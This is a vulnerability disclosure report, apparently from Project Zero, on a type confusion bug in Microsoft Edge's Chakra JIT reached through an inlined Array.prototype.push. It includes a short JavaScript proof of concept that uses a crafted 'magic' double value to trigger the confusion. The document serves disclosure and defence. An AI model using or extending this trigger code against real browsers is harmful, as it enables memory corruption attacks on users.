Microsoft Edge: Chakra: JIT: Type confusion with InlineArrayPush 




This is similar to <a href="/p/project-zero/issues/detail?id=1531" title="Microsoft Edge: Chakra: JIT: Magic value can cause type confusion" class="closed_ref" rel="nofollow"> issue 1531 </a>. The patch seems to prevent type confusion triggered from StElemI_A instructions. But the SetItem method can also be invoked through the Array.prototype.push method which can be inlineed. We can achieve type confusion with the push method in the same way used for <a href="/p/project-zero/issues/detail?id=1531" title="Microsoft Edge: Chakra: JIT: Magic value can cause type confusion" class="closed_ref" rel="nofollow"> issue 1531 </a>.

PoC:
function opt(arr, value) {
	arr.push(value);  // <--------
	arr[0] = 2.3023e-320;
}

function main() {
    for (let i = 0; i < 0x10000; i++) {
		let tmp = [1.1, 2.2, 3.3];
		delete tmp[1];

        opt(tmp, 2.2);
    }

    let arr = [1.1];
    opt(arr, -5.3049894784e-314);  // MAGIC VALUE!

    alert(arr);
}

main();

This bug is subject to a 90 day disclosure deadline. After 90 days elapse
or a patch has been made broadly available (whichever is earlier), the bug
report will become visible to the public.




Found by: lokihardt

